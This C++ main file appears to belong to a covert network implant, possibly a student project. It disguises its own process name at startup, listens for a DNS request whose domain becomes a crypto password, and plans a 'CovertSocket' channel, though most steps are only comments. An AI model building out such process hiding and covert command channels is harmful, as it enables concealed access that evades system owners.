#include <iostream>
#include <zconf.h>
#include "ProcessDistorter.h"
#include "../shared/Logger.h"
#include "../shared/argparcer.h"
#include "TrafficAnalyzer.h"
#include "NetworkMonitor.h"
#include "SystemState.h"
#include "Time.h"

int main(int argc, char * argv[]) {

    ArgParcer parcer;
    Logger::setDebug(parcer.TagExists("--DEBUG", argv, argc));
    Logger::debug("Main - Debug Mode Enabled. Parsing Arguments");

    bool useDefaultOnFail = parcer.TagExists("--DOF", argv, argc);
    bool appendHint = parcer.TagExists("--HINT", argv, argc);

    int historyLength = parcer.GetTagVal("-h", argv, argc);
    if(historyLength == -1){
        historyLength = 10;
    }

    //Create ProcessDistorter
    ProcessDistorter * processDistorter = new ProcessDistorter(argv, useDefaultOnFail, appendHint);
    //Execute this immediately to hide process to something
    processDistorter->determineProcessName();

    //Create TrafficAnalyzer
    TrafficAnalyzer * analyzer = new TrafficAnalyzer(historyLength);
    analyzer->setNewTimeSegment();

    Time * time = new Time();
    SystemState * ss = SystemState::getInstance(time);

    //Create NetworkMonitor
    HCrypto * crypto = nullptr;
    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance(analyzer, crypto, ss);

    //WE ARE CURRENTLY IN STARTUP MODE
    // 1. Start NetworkMonitor to Listen for DNS
    // 2. Upon Return DNS is All That Will Be In TrafficAnalyzer. Fetch Out This Packet Manually
    // 3. Parse Out Domain In Request -> Set As Authentication Password & Create Crypto with that password
    // 3. Tell CovertSocket To Send. It Will Use TrafficAnalyzer which will give its only Packet
    // 4. Tell SystemState To Do Analyses -> Which Will Set Our New State Out of STARTUP + Time Settings
    // 5. Start Threading For Full Functionality + Time Rules Now Apply


    // - Pass TrafficAnalyzer

    //Create CovertSocket
    // - Pass TrafficAnalyzer

    //Create SystemState
    //Register All Components To SystemState

    //Manually set SystemState to 'FullCaution Mode'
    //Start SystemState Analysis

    //Start SystemState Looping


    //cleanup when we close
    delete(processDistorter);
    delete(analyzer);
    delete(ss);
    delete(networkMonitor);
    delete(crypto);

    return 0;

}